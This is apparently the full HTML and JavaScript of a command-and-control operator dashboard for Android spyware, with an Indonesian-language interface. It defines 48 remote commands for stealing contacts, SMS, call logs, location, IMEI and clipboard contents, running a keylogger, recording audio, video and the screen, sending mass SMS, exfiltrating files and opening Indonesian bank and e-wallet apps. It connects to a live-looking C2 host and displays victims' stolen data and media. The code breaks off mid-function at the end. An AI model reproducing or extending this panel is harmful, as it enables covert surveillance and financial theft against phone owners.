<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>🔬 DASHBOARD ULTIMATE v3.0</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0e17;color:#e0e0e0;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh}
        .container{max-width:1400px;margin:0 auto;padding:20px}
        .header{display:flex;justify-content:space-between;align-items:center;padding:15px 20px;background:linear-gradient(135deg,#0d1a2b,#1a2a3f);border-radius:12px;margin-bottom:20px;border:1px solid #2a3f5f}
        .header h1{font-size:24px;color:#4fc3f7}
        .header .badge{background:#2a3f5f;padding:5px 15px;border-radius:20px;font-size:12px;color:#4fc3f7}
        .login-container{max-width:400px;margin:100px auto;background:#0d1a2b;padding:40px;border-radius:12px;border:1px solid #2a3f5f}
        .login-container h2{color:#4fc3f7;margin-bottom:20px;text-align:center}
        .login-container input{width:100%;padding:12px;border-radius:8px;border:1px solid #2a3f5f;background:#0a0e17;color:#e0e0e0;margin-bottom:15px}
        .login-container button{width:100%;padding:12px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;font-size:16px;cursor:pointer}
        .login-container button:hover{background:#2a4a6f}
        .login-error{color:#ff6b6b;text-align:center;margin-top:10px;display:none}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:20px}
        .stat-card{background:linear-gradient(135deg,#0d1a2b,#1a2a3f);padding:15px;border-radius:10px;border:1px solid #2a3f5f;text-align:center}
        .stat-card .num{font-size:28px;font-weight:bold;color:#4fc3f7}
        .stat-card .label{font-size:11px;color:#8899aa;margin-top:5px}
        .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
        .tab{background:#0d1a2b;padding:10px 20px;border-radius:8px;cursor:pointer;border:1px solid #2a3f5f;color:#8899aa;transition:0.3s;font-size:12px}
        .tab.active{background:#1a3a5f;border-color:#4fc3f7;color:#4fc3f7}
        .tab:hover{background:#1a2a3f}
        .panel{display:none;background:#0d1a2b;border-radius:10px;padding:20px;border:1px solid #2a3f5f}
        .panel.active{display:block}
        .table-wrap{overflow-x:auto}
        table{width:100%;border-collapse:collapse;font-size:13px}
        th{background:#1a2a3f;padding:10px 12px;text-align:left;color:#4fc3f7;border-bottom:2px solid #2a3f5f;position:sticky;top:0}
        td{padding:8px 12px;border-bottom:1px solid #1a2a3f;word-break:break-all}
        tr:hover{background:#0d1a2b}
        .cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px}
        .cmd-btn{background:#0d1a2b;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;color:#e0e0e0;cursor:pointer;text-align:center;font-size:11px;transition:0.3s}
        .cmd-btn:hover{background:#1a3a5f;border-color:#4fc3f7}
        .cmd-btn.danger{border-color:#5f1a1a;color:#ff6b6b}
        .cmd-btn.danger:hover{background:#3a1a1a}
        .cmd-btn.success{border-color:#1a4a2a;color:#4caf50}
        .cmd-btn.success:hover{background:#1a2a1a}
        .cmd-btn.warning{border-color:#5f4a1a;color:#ffd93d}
        .cmd-btn.warning:hover{background:#3a2a1a}
        .cmd-category{margin-bottom:15px}
        .cmd-category .cat-title{color:#4fc3f7;font-size:13px;font-weight:bold;margin-bottom:8px;padding:5px 10px;background:#0d1a2b;border-radius:6px;border-left:3px solid #4fc3f7}
        .input-group{display:flex;gap:10px;margin:10px 0;flex-wrap:wrap}
        .input-group input,.input-group select{padding:10px 15px;border-radius:8px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;flex:1;min-width:150px}
        .input-group button{padding:10px 20px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer}
        .input-group button:hover{background:#2a4a6f}
        .log-area{background:#050a12;border-radius:8px;padding:15px;height:300px;overflow-y:auto;font-family:monospace;font-size:12px;border:1px solid #1a2a3f}
        .log-entry{padding:3px 0;border-bottom:1px solid #0a1520}
        .log-entry .time{color:#4fc3f7}
        .log-entry .type{color:#8899aa}
        .log-entry .data{color:#e0e0e0}
        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:1000;justify-content:center;align-items:center}
        .modal.active{display:flex}
        .modal-content{background:#0d1a2b;padding:30px;border-radius:12px;max-width:600px;width:90%;border:1px solid #2a3f5f;max-height:80vh;overflow-y:auto}
        .modal-close{float:right;background:transparent;border:none;color:#8899aa;font-size:24px;cursor:pointer}
        .modal-close:hover{color:#e0e0e0}
        .dashboard-content{display:none}
        .search-box{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
        .search-box input{flex:1;padding:8px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;min-width:150px}
        .file-breadcrumb{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;padding:10px;background:#050a12;border-radius:8px;align-items:center;font-size:13px}
        .file-breadcrumb span{cursor:pointer;color:#4fc3f7}
        .file-breadcrumb span:hover{text-decoration:underline}
        .file-item{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-bottom:1px solid #0d1a2b;cursor:pointer}
        .file-item:hover{background:#0d1a2b}
        .file-item .name{color:#e0e0e0;font-size:13px}
        .file-item .size{color:#8899aa;font-size:11px}
        .file-item .actions{display:flex;gap:10px}
        .file-item .actions button{background:transparent;border:none;cursor:pointer;font-size:14px}
        .file-item .actions .download-btn{color:#4fc3f7}
        .file-item .actions .delete-btn{color:#ff6b6b}
        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:15px}
        .media-card{background:#0d1a2b;border-radius:10px;border:1px solid #2a3f5f;overflow:hidden;cursor:pointer;transition:0.3s}
        .media-card:hover{border-color:#4fc3f7;transform:scale(1.02)}
        .media-card .preview{width:100%;height:150px;object-fit:cover;background:#0a0e17;display:flex;justify-content:center;align-items:center;font-size:48px}
        .media-card .info{padding:8px 10px;font-size:11px;color:#8899aa}
        .media-card .info .sumber{color:#4fc3f7}
        .empty-state{text-align:center;color:#8899aa;padding:40px;grid-column:1/-1}
        @media(max-width:600px){.header{flex-direction:column;gap:10px;text-align:center}.tabs{justify-content:center}.cmd-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr)}}
    </style>
</head>
<body>

<!-- LOGIN -->
<div id="loginContainer" class="login-container">
    <h2>🔐 DASHBOARD LOGIN</h2>
    <input type="password" id="loginPassword" placeholder="Masukkan password..." onkeydown="if(event.key==='Enter'){login();}">
    <button onclick="login()">🔓 LOGIN</button>
    <div id="loginError" class="login-error">❌ Password salah!</div>
</div>

<!-- DASHBOARD -->
<div id="dashboardContent" class="dashboard-content">
    <div class="container">
        <div class="header">
            <h1>🔬 DASHBOARD ULTIMATE v3.0</h1>
            <div>
                <span class="badge" id="statusBadge">🟢 Online</span>
                <span class="badge" id="deviceCount">📱 0 Devices</span>
                <span class="badge" id="cmdCount">⚡ 48 Commands</span>
                <button onclick="logout()" style="background:#3a1a1a;border:none;color:#ff6b6b;padding:5px 15px;border-radius:8px;cursor:pointer;margin-left:10px">🚪 Logout</button>
            </div>
        </div>

        <!-- STATS -->
        <div class="stats" id="statsContainer">
            <div class="stat-card"><div class="num" id="statTotal">0</div><div class="label">Total Data</div></div>
            <div class="stat-card"><div class="num" id="statDevices">0</div><div class="label">Device Online</div></div>
            <div class="stat-card"><div class="num" id="statSMS">0</div><div class="label">SMS</div></div>
            <div class="stat-card"><div class="num" id="statContacts">0</div><div class="label">Kontak</div></div>
            <div class="stat-card"><div class="num" id="statLocation">0</div><div class="label">Lokasi</div></div>
        </div>

        <!-- TABS -->
        <div class="tabs">
            <div class="tab active" onclick="showPanel('data')">📱 Data</div>
            <div class="tab" onclick="showPanel('c2')">⚡ C2 (48)</div>
            <div class="tab" onclick="showPanel('logs')">📋 Logs</div>
            <div class="tab" onclick="showPanel('media')">📸 Media</div>
            <div class="tab" onclick="showPanel('files')">📁 Files</div>
        </div>

        <!-- PANEL DATA -->
        <div class="panel active" id="panelData">
            <div class="input-group">
                <input type="text" id="searchInput" placeholder="🔍 Cari data..." oninput="filterData()">
                <select id="filterType" onchange="filterData()">
                    <option value="">Semua Tipe</option>
                    <option value="sms">SMS</option>
                    <option value="kontak">Kontak</option>
                    <option value="lokasi">Lokasi</option>
                    <option value="device">Device</option>
                    <option value="screenshot">Screenshot</option>
                    <option value="clipboard">Clipboard</option>
                    <option value="call_log">Call Log</option>
                </select>
                <button onclick="refreshData()">🔄 Refresh</button>
                <button onclick="exportData()">📤 Export</button>
            </div>
            <div class="table-wrap">
                <table>
                    <thead><tr><th>Waktu</th><th>Sumber</th><th>Data</th><th>Device</th></tr></thead>
                    <tbody id="dataTableBody"></tbody>
                </table>
            </div>
        </div>

        <!-- PANEL C2 -->
        <div class="panel" id="panelC2">
            <div class="search-box">
                <input type="text" id="cmdSearch" placeholder="🔍 Cari command..." oninput="filterCommands()">
                <select id="cmdCategoryFilter" onchange="filterCommands()">
                    <option value="">Semua Kategori (48)</option>
                    <option value="data">📱 Data Pribadi (10)</option>
                    <option value="notif">🔔 Notifikasi (4)</option>
                    <option value="keylogger">⌨️ Keylogger (4)</option>
                    <option value="komunikasi">💬 Komunikasi (3)</option>
                    <option value="apps">📱 Kontrol Aplikasi (5)</option>
                    <option value="target">💰 Target Aplikasi (7)</option>
                    <option value="media">🎥 Media (5)</option>
                    <option value="screen">📹 Screen Recording (3)</option>
                    <option value="file">📁 File (2)</option>
                    <option value="sistem">🔧 Sistem (5)</option>
                </select>
            </div>
            <div id="cmdContainer"></div>
            <div class="input-group" style="margin-top:15px">
                <input type="text" id="customCmd" placeholder="📝 Custom command..." onkeydown="if(event.key==='Enter'){sendCustomCommand();}">
                <input type="text" id="customParam" placeholder="📝 Parameter (opsional)" style="flex:0.5;min-width:100px">
                <button onclick="sendCustomCommand()">📤 Kirim</button>
            </div>
            <div id="cmdResult" style="margin-top:10px;padding:10px;background:#050a12;border-radius:8px;font-family:monospace;font-size:12px;display:none;max-height:200px;overflow-y:auto"></div>
        </div>

        <!-- PANEL LOGS -->
        <div class="panel" id="panelLogs">
            <div class="input-group">
                <input type="text" id="logSearch" placeholder="🔍 Cari log..." oninput="filterLogs()">
                <button onclick="clearLogs()">🗑️ Clear</button>
            </div>
            <div class="log-area" id="logArea"></div>
        </div>

        <!-- PANEL MEDIA (REAL) -->
        <div class="panel" id="panelMedia">
            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
                <h3 style="color:#4fc3f7;">📸 Media Preview</h3>
                <button onclick="renderMedia()" style="padding:8px 15px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">🔄 Refresh</button>
            </div>
            <div id="mediaGallery" class="media-grid"></div>
        </div>

        <!-- PANEL FILES (REAL) -->
        <div class="panel" id="panelFiles">
            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
                <h3 style="color:#4fc3f7;">📁 File Manager</h3>
                <div style="display:flex;gap:10px;flex-wrap:wrap;">
                    <button onclick="renderFiles('/sdcard/')" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;cursor:pointer;font-size:12px;">📂 /sdcard</button>
                    <button onclick="renderFiles('/storage/emulated/0/')" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;cursor:pointer;font-size:12px;">📂 Internal</button>
                    <button onclick="uploadFile()" style="padding:6px 12px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-size:12px;">📤 Upload</button>
                    <button onclick="renderFiles(currentFilePath)" style="padding:6px 12px;border-radius:6px;border:1px solid #2a3f5f;background:#0d1a2b;color:#4fc3f7;cursor:pointer;font-size:12px;">🔄 Refresh</button>
                </div>
            </div>
            <div id="fileList"></div>
        </div>
    </div>
</div>

<!-- MODAL -->
<div class="modal" id="modal">
    <div class="modal-content">
        <button class="modal-close" onclick="closeModal()">&times;</button>
        <div id="modalBody"></div>
    </div>
</div>

<script>
// ============================================================
// 🔥 DASHBOARD - FULL VERSION (MEDIA + FILES REAL!)
// ============================================================

var PASSWORD = '';
var allData = [];
var logEntries = [];
var ws = null;
var currentFilePath = '/sdcard/';

// ============================================================
// 🔥 48 C2 COMMANDS
// ============================================================
var C2_COMMANDS = {
    'data': {
        label: '📱 Data Pribadi (10)',
        commands: [
            { id: 'ambil_kontak', label: '📇 Ambil Kontak' },
            { id: 'ambil_sms', label: '💬 Ambil SMS' },
            { id: 'ambil_call_log', label: '📞 Ambil Call Log' },
            { id: 'ambil_lokasi', label: '📍 Ambil Lokasi' },
            { id: 'get_clipboard', label: '📋 Get Clipboard' },
            { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
            { id: 'ambil_imei', label: '📱 IMEI' },
            { id: 'ambil_imsi', label: '📱 IMSI' },
            { id: 'ambil_nomor_hp', label: '📱 Nomor HP' },
            { id: 'get_installed_apps', label: '📱 Installed Apps' }
        ]
    },
    'notif': {
        label: '🔔 Notifikasi (4)',
        commands: [
            { id: 'get_notifications', label: '🔔 Get Notifications' },
            { id: 'get_notifications_history', label: '📜 Notif History' },
            { id: 'clear_notification', label: '🗑️ Clear Notif', param: 'id' },
            { id: 'clear_all_notifications', label: '🗑️ Clear All Notif' }
        ]
    },
    'keylogger': {
        label: '⌨️ Keylogger (4)',
        commands: [
            { id: 'keylogger_start', label: '▶️ Keylogger Start' },
            { id: 'keylogger_stop', label: '⏹️ Keylogger Stop' },
            { id: 'keylogger_upload', label: '📤 Keylogger Upload' },
            { id: 'keylogger_status', label: '📊 Keylogger Status' }
        ]
    },
    'komunikasi': {
        label: '💬 Komunikasi (3)',
        commands: [
            { id: 'kirim_sms', label: '📨 Kirim SMS', param: 'nomor|pesan' },
            { id: 'kirim_sms_massal', label: '📨 SMS Massal', param: 'file.txt' },
            { id: 'call_number', label: '📞 Call Number', param: 'nomor' }
        ]
    },
    'apps': {
        label: '📱 Kontrol Aplikasi (5)',
        commands: [
            { id: 'buka_aplikasi', label: '📱 Buka Aplikasi', param: 'package' },
            { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package' },
            { id: 'app_force_stop', label: '⏹️ Force Stop', param: 'package' },
            { id: 'app_clear_data', label: '🧹 Clear Data', param: 'package' },
            { id: 'buka_url', label: '🌐 Buka URL', param: 'url' }
        ]
    },
    'target': {
        label: '💰 Target Aplikasi (7)',
        commands: [
            { id: 'buka_dana', label: '💰 DANA' },
            { id: 'buka_gopay', label: '💰 GoPay' },
            { id: 'buka_ovo', label: '💰 OVO' },
            { id: 'buka_bri', label: '🏦 BRI' },
            { id: 'buka_bca', label: '🏦 BCA' },
            { id: 'buka_mandiri', label: '🏦 Mandiri' },
            { id: 'buka_shopee', label: '🛍️ Shopee' }
        ]
    },
    'media': {
        label: '🎥 Media (5)',
        commands: [
            { id: 'screenshot', label: '📸 Screenshot' },
            { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
            { id: 'stop_audio', label: '⏹️ Stop Audio' },
            { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
            { id: 'stop_video', label: '⏹️ Stop Video' }
        ]
    },
    'screen': {
        label: '📹 Screen Recording (3)',
        commands: [
            { id: 'screen_record', label: '📹 Start Record', param: 'durasi' },
            { id: 'screen_record_stop', label: '⏹️ Stop Record' },
            { id: 'screen_record_status', label: '📊 Record Status' }
        ]
    },
    'file': {
        label: '📁 File (2)',
        commands: [
            { id: 'list_file', label: '📂 List File', param: 'path' },
            { id: 'ambil_file', label: '📄 Ambil File', param: 'path' }
        ]
    },
    'sistem': {
        label: '🔧 Sistem (5)',
        commands: [
            { id: 'get_system_info', label: '📊 System Info' },
            { id: 'get_battery', label: '🔋 Battery' },
            { id: 'get_wifi', label: '📶 WiFi' },
            { id: 'vibrate', label: '📳 Vibrate', param: 'ms' },
            { id: 'toast', label: '💬 Toast', param: 'pesan' }
        ]
    }
};

// ============================================================
// LOGIN
// ============================================================
function login() {
    var inputPass = document.getElementById('loginPassword').value.trim();
    if (!inputPass) {
        document.getElementById('loginError').style.display = 'block';
        document.getElementById('loginError').textContent = '❌ Masukkan password!';
        return;
    }
    fetch('/data?key=' + inputPass)
        .then(function(response) {
            if (response.status === 200) {
                PASSWORD = inputPass;
                document.getElementById('loginContainer').style.display = 'none';
                document.getElementById('dashboardContent').style.display = 'block';
                document.getElementById('loginError').style.display = 'none';
                initDashboard();
            } else {
                document.getElementById('loginError').style.display = 'block';
                document.getElementById('loginError').textContent = '❌ Password salah!';
            }
        })
        .catch(function() {
            document.getElementById('loginError').style.display = 'block';
            document.getElementById('loginError').textContent = '❌ Server error!';
        });
}

function logout() {
    PASSWORD = '';
    document.getElementById('dashboardContent').style.display = 'none';
    document.getElementById('loginContainer').style.display = 'block';
    document.getElementById('loginPassword').value = '';
    if (ws) { ws.close(); ws = null; }
}

function initDashboard() {
    renderC2Commands();
    connectWebSocket();
    refreshData();
    renderMedia();
    renderFiles('/sdcard/');
    setInterval(refreshData, 10000);
    addLog('info', 'Dashboard initialized');
}

function showPanel(id) {
    document.querySelectorAll('.panel').forEach(function(p) { p.classList.remove('active'); });
    document.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
    document.getElementById('panel' + id.charAt(0).toUpperCase() + id.slice(1)).classList.add('active');
    document.querySelector('.tab[onclick="showPanel(\'' + id + '\')"]').classList.add('active');
    
    if (id === 'media') renderMedia();
    if (id === 'files') renderFiles(currentFilePath);
}

// ============================================================
// WEBSOCKET
// ============================================================
function connectWebSocket() {
    try {
        ws = new WebSocket('wss://verifikasi.site/ws');
        ws.onopen = function() {
            addLog('info', 'WebSocket connected');
            ws.send(JSON.stringify({ type: 'auth', key: PASSWORD, role: 'admin' }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'new_data') {
                    addLog('data', 'New data from ' + (data.device || 'unknown'));
                    refreshData();
                } else if (data.type === 'c2_result') {
                    addLog('c2', 'C2 Result: ' + JSON.stringify(data.result));
                    showCmdResult(data.result);
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            addLog('error', 'WebSocket disconnected, reconnecting...');
            setTimeout(connectWebSocket, 5000);
        };
        ws.onerror = function() { addLog('error', 'WebSocket error'); };
    } catch(e) {
        addLog('error', 'WebSocket connection failed');
    }
}

// ============================================================
// RENDER C2 COMMANDS
// ============================================================
function renderC2Commands() {
    var container = document.getElementById('cmdContainer');
    container.innerHTML = '';
    
    Object.keys(C2_COMMANDS).forEach(function(catKey) {
        var cat = C2_COMMANDS[catKey];
        var div = document.createElement('div');
        div.className = 'cmd-category';
        div.setAttribute('data-category', catKey);
        
        var title = document.createElement('div');
        title.className = 'cat-title';
        title.textContent = cat.label;
        div.appendChild(title);
        
        var grid = document.createElement('div');
        grid.className = 'cmd-grid';
        
        cat.commands.forEach(function(cmd) {
            var btn = document.createElement('div');
            btn.className = 'cmd-btn';
            if (cmd.id.includes('uninstall') || cmd.id.includes('clear_') || cmd.id.includes('stop')) {
                btn.className += ' danger';
            } else if (cmd.id.includes('start') || cmd.id.includes('record')) {
                btn.className += ' success';
            } else if (cmd.id.includes('get') || cmd.id.includes('ambil')) {
                btn.className += ' warning';
            }
            btn.textContent = cmd.label;
            btn.setAttribute('data-id', cmd.id);
            btn.setAttribute('data-param', cmd.param || '');
            btn.title = 'ID: ' + cmd.id + (cmd.param ? ' | Param: ' + cmd.param : '');
            
            btn.onclick = function() {
                var param = this.getAttribute('data-param');
                if (param) {
                    openParamModal(cmd.id, cmd.label, param);
                } else {
                    sendC2Command(cmd.id, '');
                }
            };
            grid.appendChild(btn);
        });
        
        div.appendChild(grid);
        container.appendChild(div);
    });
    
    document.getElementById('cmdCount').textContent = '⚡ 48 Commands';
}

function filterCommands() {
    var search = document.getElementById('cmdSearch').value.toLowerCase();
    var category = document.getElementById('cmdCategoryFilter').value;
    
    document.querySelectorAll('.cmd-category').forEach(function(cat) {
        var showCat = true;
        if (category && cat.getAttribute('data-category') !== category) {
            showCat = false;
        }
        
        var btns = cat.querySelectorAll('.cmd-btn');
        var hasMatch = false;
        btns.forEach(function(btn) {
            var match = true;
            if (search && !btn.textContent.toLowerCase().includes(search) && !btn.getAttribute('data-id').includes(search)) {
                match = false;
            }
            btn.style.display = match ? '' : 'none';
            if (match) hasMatch = true;
        });
        
        cat.style.display = (showCat && hasMatch) ? '' : 'none';
    });
}

function openParamModal(cmdId, cmdLabel, paramDesc) {
    var html = '<h3 style="color:#4fc3f7;margin-bottom:15px">📤 ' + cmdLabel + '</h3>';
    html += '<p style="color:#8899aa;margin-bottom:10px">Parameter: <strong>' + paramDesc + '</strong></p>';
    html += '<input type="text" id="paramInput" placeholder="Masukkan parameter..." style="width:100%;padding:10px;border-radius:8px;border:1px solid #2a3f5f;background:#0d1a2b;color:#e0e0e0;margin-bottom:15px">';
    html += '<div style="display:flex;gap:10px">';
    html += '<button onclick="sendC2CommandWithParam(\'' + cmdId + '\')" style="flex:1;padding:10px;border-radius:8px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer">📤 Kirim</button>';
    html += '<button onclick="closeModal()" style="flex:1;padding:10px;border-radius:8px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer">❌ Batal</button>';
    html += '</div>';
    openModal(html);
}

function sendC2CommandWithParam(cmdId) {
    var param = document.getElementById('paramInput').value.trim();
    closeModal();
    sendC2Command(cmdId, param);
}

function sendC2Command(cmd, param) {
    addLog('c2', 'Sending command: ' + cmd + (param ? ' | param: ' + param : ''));
    
    var data = { command: cmd, target: 'all', timestamp: Date.now() };
    if (param) {
        if (param.includes('|')) {
            var parts = param.split('|');
            data.param1 = parts[0] || '';
            data.param2 = parts[1] || '';
        } else {
            data.param = param;
        }
    }
    
    fetch('/c2?key=' + PASSWORD, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    })
    .then(function(r) { return r.json(); })
    .then(function(data) {
        addLog('c2', 'Command sent: ' + cmd + ' - ' + (data.status || 'ok'));
    })
    .catch(function(e) {
        addLog('error', 'Send command failed: ' + e.message);
    });
}

function sendCustomCommand() {
    var cmd = document.getElementById('customCmd').value.trim();
    var param = document.getElementById('customParam').value.trim();
    if (!cmd) return;
    sendC2Command(cmd, param);
    document.getElementById('customCmd').value = '';
    document.getElementById('customParam').value = '';
}

function showCmdResult(result) {
    var el = document.getElementById('cmdResult');
    el.style.display = 'block';
    el.textContent = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
    setTimeout(function() { el.style.display = 'none'; }, 15000);
}

// ============================================================
// DATA
// ============================================================
function refreshData() {
    fetch('/data?key=' + PASSWORD)
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.data) {
                allData = data.data;
                renderData(allData);
                updateStats(allData);
                updateDeviceCount();
            }
        })
        .catch(function(e) { addLog('error', 'Refresh data failed: ' + e.message); });
}

function renderData(data) {
    var tbody = document.getElementById('dataTableBody');
    tbody.innerHTML = '';
    
    var filtered = data;
    var search = document.getElementById('searchInput').value.toLowerCase();
    var filterType = document.getElementById('filterType').value;
    
    if (search) {
        filtered = filtered.filter(function(item) {
            return JSON.stringify(item).toLowerCase().includes(search);
        });
    }
    if (filterType) {
        filtered = filtered.filter(function(item) {
            return item.sumber === filterType;
        });
    }
    
    filtered.slice(0, 100).forEach(function(item) {
        var tr = document.createElement('tr');
        var time = new Date(item.waktu).toLocaleString('id-ID');
        var dataStr = typeof item.data === 'object' ? JSON.stringify(item.data).substring(0, 100) : (item.data || '');
        var device = item.device || '-';
        tr.innerHTML = '<td>' + time + '</td><td>' + item.sumber + '</td><td>' + dataStr + '</td><td>' + device + '</td>';
        tbody.appendChild(tr);
    });
}

function updateStats(data) {
    var sms = data.filter(function(d) { return d.sumber === 'sms' || d.sumber === 'sms_all'; });
    var contacts = data.filter(function(d) { return d.sumber === 'kontak' || d.sumber === 'kontak_all'; });
    var loc = data.filter(function(d) { return d.sumber === 'lokasi' || d.sumber === 'geolocation_browser'; });
    
    document.getElementById('statTotal').textContent = data.length;
    document.getElementById('statSMS').textContent = sms.length;
    document.getElementById('statContacts').textContent = contacts.length;
    document.getElementById('statLocation').textContent = loc.length;
}

function updateDeviceCount() {
    fetch('/data?type=devices&key=' + PASSWORD)
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.count) {
                document.getElementById('deviceCount').textContent = '📱 ' + data.count + ' Devices';
            }
        })
        .catch(function() {});
}

function filterData() { renderData(allData); }

function exportData() {
    var blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'data_export_' + Date.now() + '.json';
    a.click();
}

// LOGS
// ============================================================
function addLog(type, message) {
    var entry = { time: new Date().toLocaleTimeString('id-ID'), type: type, message: message };
    logEntries.unshift(entry);
    renderLogs();
}

function renderLogs() {
    var area = document.getElementById('logArea');
    var search = document.getElementById('logSearch').value.toLowerCase();
    var filtered = logEntries;
    if (search) {
        filtered = filtered.filter(function(e) {
            return e.message.toLowerCase().includes(search) || e.type.includes(search);
        });
    }
    area.innerHTML = filtered.slice(0, 200).map(function(e) {
        return '<div class="log-entry"><span class="time">[' + e.time + ']</span> <span class="type">[' + e.type + ']</span> <span class="data">' + e.message + '</span></div>';
    }).join('');
}

function filterLogs() { renderLogs(); }
function clearLogs() { logEntries = []; renderLogs(); }

// 🔥 PANEL MEDIA - REAL!
// ============================================================
function renderMedia() {
    var gallery = document.getElementById('mediaGallery');
    gallery.innerHTML = '<div class="empty-state">⏳ Memuat media...</div>';
    
    fetch('/data?key=' + PASSWORD + '&limit=200')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            gallery.innerHTML = '';
            
            if (!data || !data.data || data.data.length === 0) {
                gallery.innerHTML = '<div class="empty-state">📭 Belum ada data</div>';
                return;
            }
            
            var mediaItems = data.data.filter(function(item) {
                var src = item.sumber || '';
                return src.includes('screenshot') || 
                       src.includes('photo') || 
                       src.includes('gallery') ||
                       src.includes('audio') ||
                       src.includes('video') ||
                       src.includes('image') ||
                       src.includes('record') ||
                       (typeof item.data === 'string' && item.data.startsWith('data:'));
            });
            
            if (mediaItems.length === 0) {
                gallery.innerHTML = '<div class="empty-state">📭 Tidak ada media</div>';
                return;
            }
            
            mediaItems.slice(0, 50).forEach(function(item) {
                var card = document.createElement('div');
                card.className = 'media-card';
                card.onclick = function() { openMediaModal(item); };
                
                var dataStr = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
                var isImage = dataStr.startsWith('data:image');
                var isAudio = dataStr.startsWith('data:audio');
                var isVideo = dataStr.startsWith('data:video');
                
                var previewHtml = '';
                if (isImage && dataStr.length < 500000) {
                    previewHtml = '<img src="' + dataStr + '" class="preview">';
                } else if (isAudio) {
                    previewHtml = '<div class="preview">🎵</div>';
                } else if (isVideo) {
                    previewHtml = '<div class="preview">🎬</div>';
                } else {
                    previewHtml = '<div class="preview">📄</div>';
                }
                
                var time = new Date(item.waktu).toLocaleString('id-ID');
                card.innerHTML = previewHtml + 
                    '<div class="info"><span class="sumber">' + item.sumber + '</span><br>' + time + '</div>';
                gallery.appendChild(card);
            });
        })
        .catch(function(e) {
            gallery.innerHTML = '<div class="empty-state">❌ Gagal memuat media: ' + e.message + '</div>';
        });
}

// ============================================================
// 🔥 MODAL MEDIA
// ============================================================
function openMediaModal(item) {
    var dataStr = typeof item.data === 'string' ? item.data : JSON.stringify(item.data);
    var isImage = dataStr.startsWith('data:image');
    var isAudio = dataStr.startsWith('data:audio');
    var isVideo = dataStr.startsWith('data:video');
    
    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📸 ' + item.sumber + '</h3>';
    html += '<p style="color:#8899aa;font-size:12px;margin-bottom:15px">' + new Date(item.waktu).toLocaleString('id-ID') + '</p>';
    
    if (isImage) {
        html += '<img src="' + dataStr + '" style="max-width:100%;max-height:70vh;border-radius:8px;">';
    } else if (isAudio) {
        html += '<audio controls style="width:100%;margin:10px 0;" src="' + dataStr + '"></audio>';
        html += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:300px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">' + dataStr.substring(0, 300) + '...</div>';
    } else if (isVideo) {
        html += '<video controls style="max-width:100%;max-height:70vh;border-radius:8px;" src="' + dataStr + '"></video>';
    } else {
        html += '<div style="background:#050a12;padding:15px;border-radius:8px;max-height:500px;overflow:auto;font-size:11px;font-family:monospace;color:#8899aa;word-break:break-all;">' + dataStr + '</div>';
    }
    
    html += '<div style="margin-top:15px;display:flex;gap:10px;">';
    html += '<button onclick="downloadMedia(\'' + dataStr + '\',\'' + item.sumber + '\')" style="flex:1;padding:8px;border-radius:6px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;">📥 Download</button>';
    html += '<button onclick="closeModal()" style="flex:1;padding:8px;border-radius:6px;border:1px solid #2a3f5f;background:transparent;color:#8899aa;cursor:pointer;">❌ Tutup</button>';
    html += '</div>';
    
    openModal(html);
}

function downloadMedia(dataUrl, filename) {
    try {
        var link = document.createElement('a');
        link.href = dataUrl;
        var ext = 'png';
        if (dataUrl.startsWith('data:image/jpeg')) ext = 'jpg';
        else if (dataUrl.startsWith('data:image/png')) ext = 'png';
        else if (dataUrl.startsWith('data:audio')) ext = 'mp3';
        else if (dataUrl.startsWith('data:video')) ext = 'mp4';
        else if (dataUrl.startsWith('data:application')) ext = 'bin';
